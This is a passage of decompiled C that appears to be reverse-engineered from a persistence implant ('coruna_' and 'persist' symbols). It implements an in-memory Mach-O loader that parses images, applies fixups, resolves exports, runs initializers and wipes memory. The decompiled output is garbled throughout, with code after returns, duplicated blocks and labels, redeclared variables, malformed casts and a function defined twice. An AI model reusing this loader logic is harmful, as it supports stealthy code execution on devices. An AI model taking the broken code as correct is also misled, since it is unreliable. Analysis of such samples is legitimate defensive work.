            type_id_9 = 0;
          }
          type_id_15 = type_id_15 + 1;
        } while ((int)type_id_9 == 0);
        }
      }
    }
  }
  __Block_object_dispose(&cache_98,8);
  __Block_object_dispose(&plist,8);
  __Block_object_dispose(&work,8);
load_ok_24:
  if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return type_id_9;
  }
  ___stack_chk_fail();
}





uint64_t coruna_wire_store_u32_pair(long handle,long addr_2)
{
  *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = *(uint32_t *)(addr_2 + 8);
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = *(uint32_t *)(addr_2 + 0xc);
  return 0;
}





uint64_t coruna_getattrlistbulk_paths(long *handle)
{
  int *err;
  long handle;
  int *status;
  long addr;
  uint u;
  uint size;
  unsigned long version;
  uint64_t port;
  unsigned long tag;
  int *flags;
  unsigned long kind;
  long off;
  unsigned long type_id;
  uint type_id_8;
  unsigned long type_id_9;
  int *count;
  
  port = 0xad001;
  if ((((handle != (long *)0x0) && (flags = (int *)handle[0x29], flags != (int *)0x0)) &&
      (kind = handle[0x2a], kind != 0)) && ((*handle != 0 && (8 < kind)))) {
    if (*flags == -0x35014542 || *flags == -0x41450136) {
      port = 0x12006;
      u = flags[1];
      if (u != 0) {
        type_id_8 = 0;
        type_id = 0;
        off = 0;
        u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
        type_id_9 = (unsigned long)(u >> 0x10 | u << 0x10);
        err = (int *)((long)flags + kind);
        count = flags + 7;
        do {
          if ((long)kind < 0) {
            return 0x12004;
          }
          if (count + -5 < flags) {
            return 0x12004;
          }
          if (err <= count + -5) {
            return 0x12004;
          }
          if (count < flags) {
            return 0x12004;
          }
          if (err < count) {
            return 0x12004;
          }
          u = (count[-3] & 0xff00ff00U) >> 8 | (count[-3] & 0xff00ffU) << 8;
          tag = (unsigned long)(u >> 0x10 | u << 0x10);
          if ((long)kind <= (long)tag) {
            return 0x12005;
          }
          u = (count[-2] & 0xff00ff00U) >> 8 | (count[-2] & 0xff00ffU) << 8;
          version = (unsigned long)(u >> 0x10 | u << 0x10);
          handle = (long)flags + tag;
          status = (int *)(handle + version);
          if (status < flags || err < status) {
            return 0x12005;
          }
          if (count[-5] == 0xc000001) {
            u = (count[-4] & 0xff00ff00U) >> 8;
            u = (u | (count[-4] & 0xff0000U) << 8) >> 0x10 | u << 0x10;
            addr = off;
            tag = type_id;
            size = type_id_8;
            if (type_id_8 <= u) {
              addr = handle;
              tag = version;
              size = u;
            }
            if ((int)u <= *(int *)(*handle + 0x18)) {
              off = addr;
              type_id = tag;
              type_id_8 = size;
            }
          }
          count = count + 5;
          type_id_9 = type_id_9 - 1;
        } while (type_id_9 != 0);
        port = 0x12006;
        if (off != 0) {
          port = 0;
          handle[0x29] = off;
          handle[0x2a] = type_id;
          handle[0x2c] = 0;
        }
      }
    }
    else {
      port = 0;
    }
  }
  return port;
}





uint64_t coruna_bzero_2(long handle)
{
  long *ptr;
  char err;
  byte err;
  ushort u;
  void *buf;
  void *str;
  long *copy;
  void *data;
  unsigned long size;
  uint version;
  long handle;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long addr;
  
  if (handle == 0) {
    return 0x12011;
  }
  addr = *(long *)(handle + 0x1a8);
  if (((addr != 0) && (data = *(void **)(handle + 0x1b8), data != (void *)0x0)) &&
     (handle = *(long *)(handle + 0x1a0), handle != 0)) {
    version = *(uint *)(handle + 0xc);
    kind = (unsigned long)version;
    if ((version != 0) && (*(int *)(handle + 0x14) - 1U < 0x1fffffff)) {
      size = (unsigned long)(version << 4);
      buf = _calloc(size,1);
      if (buf == (void *)0x0) {
        return 0xad009;
      }
      version = *(uint *)(handle + 0x14);
      port = (unsigned long)version;
      str = data;
      if (*(char *)(handle + 0x1c2) == '\0') {
        str = _malloc(port);
        if (str == (void *)0x0) {
          _bzero(buf,size);
          _free(buf);
          return 0xad009;
        }
        coruna_persist_trampoline_00010010(str,data,port);
      }
      tag = 0;
      err = *(char *)(handle + 0x1c4);
      copy = (long *)(addr + 8);
      do {
        err = *(byte *)((long)copy + -4);
        if (((err != '\0') || ((err & 1) != 0)) && ((err & 0xe) != 0 && (err & 0xe0) == 0))
        {
          addr = *copy;
          handle = *(long *)(handle + 0x50);
          u = *(ushort *)((long)copy + -2);
          ptr = (long *)((long)buf + tag * 0x10);
          *ptr = (long)str + (unsigned long)*(uint *)(copy + -1);
          ptr[1] = handle + addr | (unsigned long)(u >> 3) & 1;
          tag = (unsigned long)((int)tag + 1);
        }
        copy = copy + 2;
        kind = kind - 1;
      } while (kind != 0);
      if ((*(uint *)(handle + 0xb0) != 0) && (*(void **)(handle + 0xa8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xa8),(unsigned long)*(uint *)(handle + 0xb0) << 4);
        _free(*(void **)(handle + 0xa8));
      }
      if (((*(char *)(handle + 0xc4) == '\0') && (*(uint *)(handle + 0xc0) != 0)) &&
         (*(void **)(handle + 0xb8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xb8),(unsigned long)*(uint *)(handle + 0xc0));
        _free(*(void **)(handle + 0xb8));
      }
      if ((int)tag == 0) {
        if (*(char *)(handle + 0x1c2) == '\0') {
          _bzero(str,port);
          _free(str);
        }
        _bzero(buf,size);
        _free(buf);
        buf = (void *)0x0;
        version = 0;
        str = (void *)0x0;
      }
      *(int *)(handle + 0xb0) = (int)tag;
      *(void **)(handle + 0xa8) = buf;
      *(void **)(handle + 0xb8) = str;
      *(uint *)(handle + 0xc0) = version;
      *(uint8_t *)(handle + 0xc4) = *(uint8_t *)(handle + 0x1c2);
      return 0;
    }
  }
  return 0;
}





uint64_t coruna_lookup_export(long handle,char *path,unsigned long *arg)
{
  int *err;
  unsigned long u;
  int err;
  uint64_t size;
  int *status;
  unsigned long version;
  unsigned long *ptr;
  
  size = 0x12011;
  if (((handle != 0) && (path != (char *)0x0)) && (arg != (unsigned long *)0x0)) {
    version = (unsigned long)*(uint *)(handle + 0xb0);
    if (*(uint *)(handle + 0xb0) != 0) {
      ptr = (unsigned long *)(*(long *)(handle + 0xa8) + 8);
      do {
        err = _strcmp((char *)ptr[-1],path);
        if (err == 0) {
          version = *ptr;
          err = *(int *)(*(long *)(handle + 8) + 0x10);
          *arg = version;
          return 0;
          status = (int *)(*(long *)(handle + 8) + 0x20);
          if (*status == 0x19) {
          u = *(long *)(handle + 0x18) + *(long *)(status + 6);
          if ((u <= version) && (version < *(long *)(status + 8) + u)) {
          err = status + 0x12;
          status = err + (unsigned long)(uint)status[0x10] * 0x14;
          for (; (err < status &&
          ((u = *(long *)(err + 8) + *(long *)(handle + 0x18), version < u ||
          (*(long *)(err + 10) + u <= version)))); err = err + 0x14) {
          }
          fail:
          *arg = version;
          return 0;
          }
          }
          status = (int *)((long)status + (unsigned long)(uint)status[1]);
          err = err + -1;
          *arg = version;
          return 0;
        }
        ptr = ptr + 2;
        version = version - 1;
      } while (version != 0);
    }
    size = 0x12001;
  }
  return size;
done:
  if (*status == 0x19) {
    u = *(long *)(handle + 0x18) + *(long *)(status + 6);
    if ((u <= version) && (version < *(long *)(status + 8) + u)) {
      err = status + 0x12;
      status = err + (unsigned long)(uint)status[0x10] * 0x14;
      for (; (err < status &&
             ((u = *(long *)(err + 8) + *(long *)(handle + 0x18), version < u ||
              (*(long *)(err + 10) + u <= version)))); err = err + 0x14) {
      }
fail:
      *arg = version;
      return 0;
    }
  }
  status = (int *)((long)status + (unsigned long)(uint)status[1]);
  err = err + -1;
  *arg = version;
  return 0;
  if (*status == 0x19) {
  u = *(long *)(handle + 0x18) + *(long *)(status + 6);
  if ((u <= version) && (version < *(long *)(status + 8) + u)) {
  err = status + 0x12;
  status = err + (unsigned long)(uint)status[0x10] * 0x14;
  for (; (err < status &&
  ((u = *(long *)(err + 8) + *(long *)(handle + 0x18), version < u ||
  (*(long *)(err + 10) + u <= version)))); err = err + 0x14) {
  }
  fail:
  *arg = version;
  return 0;
  }
  }
  status = (int *)((long)status + (unsigned long)(uint)status[1]);
  err = err + -1;
  *arg = version;
  return 0;
}





uint64_t coruna_macho_run_exports(long *handle,uint64_t val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) & 1) == 0) {
      u = 0;
    }
    else {
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1ef80;
      thread_attr = coruna_run_starti;
      host_info = &k_persist_rodata_word_20928;
      serial_buf = val;
      action = handle;
      u = coruna_macho_foreach_loadcmd(&thread_attr,handle,0x19,&scratch);
    }
  }
  return u;
}





uint64_t coruna_run_starti(long handle,long addr_2)
{
  uint *ptr;
  uint64_t u;
  long handle;
  long addr;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long type_id;
  
  port = addr_2 + 0x48;
  tag = port + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  if (port < tag) {
    do {
      if (*(char *)(port + 0x40) == '\x16') {
        kind = *(unsigned long *)(port + 0x28);
        if (kind < 4) goto fail;
        addr = *(long *)(handle + 0x28);
        ptr = (uint *)(*(long *)(addr + 0x18) + *(long *)(port + 0x20));
        type_id = *(unsigned long *)(addr + 0x40);
        version = type_id + *ptr;
        if (version < type_id || *(long *)(addr + 0x48) + type_id <= version) {
          return 0x12008;
        }
        version = 1;
        while (u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))(),
              (int)u == 0 && version < kind >> 2) {
          size = *(unsigned long *)(*(long *)(handle + 0x28) + 0x40);
          type_id = size + ptr[version];
          version = (unsigned long)((int)version + 1);
          if (type_id < size || *(long *)(*(long *)(handle + 0x28) + 0x48) + size <= type_id) {
            return 0x12008;
          }
        }
      }
      else {
        if (*(char *)(port + 0x40) == '\t') {
          handle = *(long *)(handle + 0x28);
          addr = 2;
          if (*(char *)(handle + 0x90) != '\0') {
            addr = 3;
          }
          kind = *(unsigned long *)(port + 0x28) >> addr;
          if (kind != 0) {
            version = 0;
            addr = *(long *)(handle + 0x18) + *(long *)(port + 0x20);
            type_id = 1;
            if (*(char *)(handle + 0x90) == '\0') goto done;
            do {
              size = *(unsigned long *)(addr + version * 8);
              version = type_id;
              while( true ) {
                if (size < *(unsigned long *)(handle + 0x40) ||
                    *(long *)(handle + 0x48) + *(unsigned long *)(handle + 0x40) <= size) {
                  return 0x12008;
                }
                u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))();
                if ((int)u != 0 || kind <= version) goto cleanup;
                handle = *(long *)(handle + 0x28);
                type_id = (unsigned long)((int)version + 1);
                if (*(char *)(handle + 0x90) != '\0') break;
done:
                size = (unsigned long)*(uint *)(addr + version * 4);
                version = type_id;
              }
            } while( true );
          }
        }
fail:
        u = 0;
      }
cleanup:
      port = port + 0x50;
    } while ((int)u == 0 && port < tag);
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_macho_run_exports_block(long *handle,uint64_t val)
{
  uint32_t u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  size = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) >> 2 & 1) == 0) {
      size = 0;
    }
    else {
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1ef80;
      thread_attr = coruna_persist_residual_48;
      host_info = &k_persist_rodata_word_20958;
      u = 0x11;
      if ((char)handle[0x12] != '\0') {
        u = 0x1a;
      }
      serial_buf = val;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,u,&scratch);
    }
  }
  return size;
}





uint64_t coruna_persist_residual_48(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  unsigned long size;
  
  handle = *(long *)(handle + 0x28);
  if (*(char *)(handle + 0x90) == '\0') {
    size = (unsigned long)*(uint *)(addr_2 + 8);
  }
  else {
    size = *(unsigned long *)(addr_2 + 8);
  }
  size = *(long *)(handle + 0x50) + size;
  if (size < *(unsigned long *)(handle + 0x40) ||
      *(long *)(handle + 0x48) + *(unsigned long *)(handle + 0x40) <= size) {
    return 0x12008;
  }
  u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))();
  return u;
}





uint64_t coruna_macho_close_image(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x42) == 2) {
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_return_zero_11b5c;
    host_info = &k_persist_rodata_word_20988;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_return_zero_11b5c(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  void *ptr;
  unsigned long port;
  uint tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  
  u = addr_2 + 0x48;
  kind = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (kind <= u) {
      return 0;
    }
    if ((*(char *)(u + 0x40) == '\n') && (type_id = *(unsigned long *)(u + 0x28), 7 < type_id)) {
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0x10) < 0) {
        return 0x12009;
      }
      size = *(long *)(handle + 0x18) + *(long *)(u + 0x20);
      port = *(unsigned long *)(handle + 8);
      version = port + *(long *)(handle + 0x10);
      if (size < port || version <= size) {
        return 0x12009;
      }
      if ((long)type_id < 0) {
        return 0x12009;
      }
      if (size + type_id < port || version < size + type_id) {
        return 0x12009;
      }
      if (size == 0) {
        return 0xad001;
      }
      ptr = _realloc(*(void **)(handle + 200),
                        (type_id & 0xfffffffffffffff8) + (unsigned long)(uint)(*(int *)(handle + 0xd0) << 3));
      if (ptr == (void *)0x0) {
        return 0xad009;
      }
      type_id = type_id >> 3;
      *(void **)(handle + 200) = ptr;
      tag = *(uint *)(handle + 0xd0) + 1;
      *(uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xd0) * 8) =
           *(uint64_t *)(size + (type_id - 1) * 8);
      if (type_id - 1 != 0) {
        do {
          *(uint64_t *)(*(long *)(handle + 200) + (unsigned long)tag * 8) =
               *(uint64_t *)((size - 0x10) + type_id * 8);
          tag = tag + 1;
          type_id = type_id - 1;
        } while (type_id != 1);
      }
      *(uint *)(handle + 0xd0) = tag;
    }
    u = u + 0x50;
  } while( true );
}





uint64_t coruna_fixup_dispatch(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    return 0xad001;
  }
  if ((*(long *)(handle + 0x188) == 0) && (*(long *)(handle + 0x198) == 0)) {
    if (*(char *)(handle + 0x138) != '\0') {
      return 0x910016;
    }
    u = coruna_macho_apply_fixups();
    return u;
  }
  u = coruna_macho_apply_chained_fixups();
  return u;
}





uint64_t coruna_macho_map_segments(uint64_t *val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (k_persist_rodata_word_1f010 < *(double *)k_persist_dyldversionnumber_slot) {
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_macho_cfstring_18a2c;
    host_info = &k_persist_rodata_word_20a78;
    serial_buf = val;
    u = coruna_macho_foreach_loadcmd(val,0x19,&scratch);
    if ((int)u != 0) {
      return u;
    }
    if ((*(char *)((long)val + 0x79) != '\0') && (*(char *)(val + 0x27) == '\0')) {
      u = coruna_objc_metaclass_prefix(*val,val);
      return u;
    }
  }
  return 0;
}





uint64_t coruna_persist_stub_36(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    if (((*(char *)(handle + 0x110) == '\0') && (*(void **)(handle + 0x100) != (void *)0x0)) &&
       (*(size_t *)(handle + 0x108) != 0)) {
      _bzero(*(void **)(handle + 0x100),*(size_t *)(handle + 0x108));
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_bzero(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    if (((*(char *)(handle + 0x110) == '\0') && (*(void **)(handle + 0x100) != (void *)0x0)) &&
       (*(size_t *)(handle + 0x108) != 0)) {
      _bzero(*(void **)(handle + 0x100),*(size_t *)(handle + 0x108));
    }
    u = 0;
  }
  return u;
}





long * coruna_macho_open_image(long handle,uint size,long addr_2,int flags,uint8_t buf)
{
  long *ptr;
  
  ptr = (long *)0x0;
  if ((((handle != 0) && (size != 0)) && (addr_2 != 0)) &&
     (((flags != 0 && (flags != -1)) && (ptr = _calloc(0x1c8,1), ptr != (long *)0x0)))) {
    ptr[0x29] = handle;
    ptr[0x2a] = (unsigned long)size;
    *ptr = addr_2;
    *(int *)(ptr + 0xb) = flags;
    *(uint32_t *)(ptr + 4) = *(uint32_t *)k_persist_mach_task_self_slot;
    *(uint8_t *)(ptr + 0x27) = buf;
    *(uint8_t *)((long)ptr + 0xfc) = 1;
    *(uint8_t *)((long)ptr + 0x1c3) = 1;
    *(uint8_t *)(ptr + 0x12) = 1;
  }
  return ptr;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if (val != (uint64_t *)0x0) {
    u = coruna_mach_vm_deallocate();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x29] = 0;
    val[0x28] = 0;
    val[0x2b] = 0;
    val[0x2a] = 0;
    val[0x2d] = 0;
    val[0x2c] = 0;
    val[0x2f] = 0;
    val[0x2e] = 0;
    val[0x31] = 0;
    val[0x30] = 0;
    val[0x33] = 0;
    val[0x32] = 0;
    val[0x35] = 0;
    val[0x34] = 0;
    val[0x37] = 0;
    val[0x36] = 0;
    val[0x38] = 0;
    _free(val);
    return u;
  }
  return 0xad001;
}





int coruna_mach_vm_deallocate(long *handle)
{
  int err;
  void (*ptr)(void);
  bool err;
  uint8_t *ptr;
  kern_return_t lk5;
  int status;
  int flags;
  int count;
  int idx;
  long handle;
  void (*buf)(void);
  long *ptr;
  long addr;
  unsigned long u;
  long off;
  unsigned long size;
  unsigned long scratch;
  long bootargs;
  
  idx = 0xad001;
  if ((handle == (long *)0x0) || (*handle == 0)) {
    return 0xad001;
  }
  if ((char)handle[0x27] != '\0') {
    if (((*(char *)((long)handle + 0xfb) == '\0') || (handle[8] == 0)) || (handle[9] == 0)) {
      status = 0;
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)(handle + 0xb),handle[8],handle[9]);
      status = 0;
      if (lk5 != 0) {
        status = 0x14011;
      }
    }
    goto fail;
  }
  if (*(char *)((long)handle + 0xf9) == '\0') {
done:
    status = 0;
    err = true;
  }
  else {
    if (k_persist_cxa_finalize_ranges_slot == (uint8_t *)0x0) {
      ___cxa_finalize(handle[8]);
    }
    else {
      scratch = handle[8];
      bootargs = handle[9];
      ___cxa_finalize_ranges(&scratch,1);
    }
    if ((int)handle[0x1a] == 0) goto done;
    size = 0;
    do {
      buf = *(void (**)(handle[0x19] + size * 8);
      ptr = (void (*)handle[1];
      err = ptr <= buf && buf < ptr + handle[2];
      if (ptr > buf || buf >= ptr + handle[2]) {
        status = 0x12009;
        flags = status;
        if (((char)handle[0x1f] != '\0') && (flags = coruna_objc_resolve_method(*handle,handle,0x3c), !err)) {
        flags = status;
        }
        status = coruna_munmap(handle);
        if (flags != 0) {
        status = flags;
        }
      }
      (*buf)();
      size = size + 1;
    } while (size < *(uint *)(handle + 0x1a));
    status = 0;
  }
cleanup:
  flags = status;
  if (((char)handle[0x1f] != '\0') && (flags = coruna_objc_resolve_method(*handle,handle,0x3c), !err)) {
    flags = status;
  }
  status = coruna_munmap(handle);
  if (flags != 0) {
    status = flags;
  }
fail:
  ptr = k_persist_mach_task_self_slot;
  flags = status;
  if (((*(char *)((long)handle + 0xfa) != '\0') && (handle[1] != 0)) && (handle[2] != 0)) {
    if ((int)handle[0x11] == 0) {
      flags = 0;
    }
    else {
      off = 0;
      size = 0;
      count = 0;
      do {
        scratch = scratch & 0xffffffffffffff00;
        flags = coruna_mlock_range(*handle,*(uint32_t *)ptr,*(uint64_t *)(handle[0x10] + off),
                             ((uint64_t *)(handle[0x10] + off))[1],3,&scratch);
        err = 0x1400e;
        if ((char)scratch != '\0') {
          err = 0;
        }
        if (flags != 0) {
          err = flags;
        }
        flags = err;
        if (count != 0) {
          flags = count;
        }
        if (err != 0) break;
        _bzero(*(void **)(handle[0x10] + off),((uint64_t *)(handle[0x10] + off))[1]);
        size = size + 1;
        off = off + 0x18;
        count = flags;
      } while (size < *(uint *)(handle + 0x11));
    }
    count = flags;
    if ((char)handle[0xf] == '\0') {
      if (((char)handle[0x1f] != '\0') && (count = coruna_objc_metaclass_prefix(handle), flags != 0)) {
        count = flags;
      }
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)ptr,handle[1],handle[2]);
      err = 0x1400c;
      if (flags != 0) {
        err = flags;
      }
      if (lk5 != 0) {
        count = err;
      }
    }
    *(uint8_t *)(handle + 0xf) = 0;
    *(uint8_t *)((long)handle + 0xfa) = 0;
    handle[1] = 0;
    handle[2] = 0;
    ptr = (long *)*handle;
    if (ptr != (long *)0x0) {
      off = *ptr;
      if (((off == 0) || (*(void (**)(off + 0x28) == (void (*)0x0)) || (ptr[1] == 0)) {
        idx = 0;
      }
      else {
        idx = (**(void (**)(off + 0x28))(off,ptr[1],0xc,(int)handle[0xb]);
      }
    }
    if (count != 0) {
      idx = count;
    }
    flags = idx;
    if (status != 0) {
      flags = status;
    }
    if ((void *)handle[0x10] != (void *)0x0) {
      _free((void *)handle[0x10]);
    }
  }
  if ((*(uint *)(handle + 0x16) != 0) && ((void *)handle[0x15] != (void *)0x0)) {
    _bzero((void *)handle[0x15],(unsigned long)*(uint *)(handle + 0x16) << 4);
    _free((void *)handle[0x15]);
  }
  *(uint32_t *)(handle + 0x16) = 0;
  handle[0x15] = 0;
  if (((*(char *)((long)handle + 0xc4) == '\0') && (*(uint *)(handle + 0x18) != 0)) &&
     ((void *)handle[0x17] != (void *)0x0)) {
    _bzero((void *)handle[0x17],(unsigned long)*(uint *)(handle + 0x18));
    _free((void *)handle[0x17]);
  }
  handle[0x17] = 0;
  *(uint32_t *)(handle + 0x18) = 0;
  *(uint8_t *)((long)handle + 0xc4) = 0;
  if ((void *)handle[0x19] != (void *)0x0) {
    _free((void *)handle[0x19]);
  }
  ptr = (long *)handle[0x1b];
  if (ptr != (long *)0x0) goto check_ok;
  while (ptr = (long *)handle[0x28], ptr != (long *)0x0) {
    handle[0x28] = *ptr;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
check_ok:
    _free(ptr);
  }
  size = (unsigned long)*(uint *)(handle + 0x14);
  if ((*(uint *)(handle + 0x14) != 0) && (off = handle[0x13], off != 0)) {
    addr = 0;
    u = 1;
    while( true ) {
      handle = *(long *)(off + addr + 8);
      if ((handle != 0) && (*(void (**)(handle + 8) != (void (*)0x0)) {
        (**(void (**)(handle + 8))(handle,*(uint64_t *)(off + addr));
        size = (unsigned long)*(uint *)(handle + 0x14);
      }
      if (size <= u) break;
      off = handle[0x13];
      u = u + 1;
      addr = addr + 0x10;
    }
    _free((void *)handle[0x13]);
  }
  handle[0x28] = 0;
  handle[0x25] = 0;
  handle[0x24] = 0;
  handle[0x27] = 0;
  handle[0x26] = 0;
  handle[0x21] = 0;
  handle[0x20] = 0;
  handle[0x23] = 0;
  handle[0x22] = 0;
  handle[0x1d] = 0;
  handle[0x1c] = 0;
  handle[0x1f] = 0;
  handle[0x1e] = 0;
  handle[0x19] = 0;
  handle[0x18] = 0;
  handle[0x1b] = 0;
  handle[0x1a] = 0;
  handle[0x15] = 0;
  handle[0x14] = 0;
  handle[0x17] = 0;
  handle[0x16] = 0;
  handle[0x11] = 0;
  handle[0x10] = 0;
  handle[0x13] = 0;
  handle[0x12] = 0;
  handle[0xd] = 0;
  handle[0xc] = 0;
  handle[0xf] = 0;
  handle[0xe] = 0;
  handle[9] = 0;
  handle[8] = 0;
  handle[0xb] = 0;
  handle[10] = 0;
  handle[5] = 0;
  handle[4] = 0;
  handle[7] = 0;
  handle[6] = 0;
  handle[1] = 0;
  *handle = 0;
  handle[3] = 0;
  handle[2] = 0;
  return flags;
}





uint64_t coruna_macho_get_uuid(uint64_t *val)
{
  int err;
  
  if (val != (uint64_t *)0x0) {
    if ((((*(char *)(val + 0x26) == '\0') && (val[0x25] != 0)) && (val[0x23] != 0)) &&
       (err = coruna_mlock_range(*val,*(uint32_t *)k_persist_mach_task_self_slot,val[0x23],
                             val[0x25],3,0), err == 0)) {
      _bzero((void *)val[0x23],val[0x25]);
      val[0x23] = 0;
      val[0x24] = 0;
      val[0x25] = 0;
    }
    val[0x36] = 0;
    val[0x35] = 0;
    val[0x38] = 0;
    val[0x37] = 0;
    val[0x32] = 0;
    val[0x31] = 0;
    val[0x34] = 0;
    val[0x33] = 0;
    val[0x2e] = 0;
    val[0x2d] = 0;
    val[0x30] = 0;
    val[0x2f] = 0;
    val[0x2a] = 0;
    val[0x29] = 0;
    val[0x2c] = 0;
    val[0x2b] = 0;
    *(uint8_t *)((long)val + 0xfc) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_lookup_export(long handle,long addr_2,uint64_t val,uint size,long *off_3)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t port;
  char scratch;
  
  port = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && ((int)val != 0)) && (off_3 != (long *)0x0)) {
    scratch = '\x01';
    port = coruna_host_processors(&scratch);
    if ((int)port == 0) {
      if (scratch == '\0') {
        handle = coruna_macho_open_image(addr_2,val,handle,*(uint32_t *)k_persist_mach_task_self_slot,0)
        ;
        if (handle == 0) {
          port = 0x12002;
        }
        else {
          version = 0;
          *(byte *)(handle + 0x110) = (byte)size & 1;
          *(bool *)(handle + 0x130) = (size & 5) != 0;
          *(byte *)(handle + 0x1c3) = ((byte)((size & 0xff) >> 1) ^ 0xff) & 1;
          *(byte *)(handle + 0x1c4) = (byte)((size & 0xff) >> 4) & 1;
          size = 0xf;
          if ((size & 4) == 0) {
            size = 0x10;
          }
          do {
            u = version + 1;
            port = (*(void (*)(&ptr_persist_fn_209a8)[version])(handle);
            version = u;
          } while ((int)port == 0 && u < size);
          if ((int)port == 0) {
            *off_3 = handle;
          }
          else {
            coruna_ctx_free(handle);
          }
        }
      }
      else {
        port = 0xad008;
      }
    }
  }
  return port;
}





uint64_t coruna_objc_resolve_lazy(long *handle)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if (*(char *)((long)handle + 0x79) == '\0') {
      u = 0;
    }
    else {
      u = coruna_objc_scan_methlist(*handle,handle);
      if ((int)u == 0) {
        u = coruna_objc_resolve_method(*handle,handle,0x28);
        *(bool *)(handle + 0x1f) = (int)u == 0;
        *(uint8_t *)(handle + 0xf) = 0;
      }
    }
  }
  return u;
}





uint64_t coruna_macho_run_on_loadcmds(long *handle)
{
  ushort u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long *serial_buf;
  long *action;
  
  if (handle == (long *)0x0) {
    return 0xad001;
  }
  if (*handle == 0) {
fail:
    size = 0xad001;
  }
  else {
    u = *(ushort *)(handle + 0x38);
    if ((u >> 2 & 1) != 0) {
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1f020;
      thread_attr = coruna_persist_residual_49;
      host_info = &k_persist_rodata_word_20a98;
      serial_buf = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x1a,&scratch);
      if ((int)size != 0) {
        return size;
      }
      if (*handle == 0) goto fail;
      u = *(ushort *)(handle + 0x38);
    }
    if ((u & 1) != 0) {
      serial_buf = (long *)handle[3];
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1f020;
      thread_attr = coruna_return_zero_18ba0;
      host_info = &k_persist_rodata_word_20ab8;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      if ((int)size != 0) {
        return size;
      }
    }
    size = 0;
    *(uint8_t *)((long)handle + 0xf9) = 1;
  }
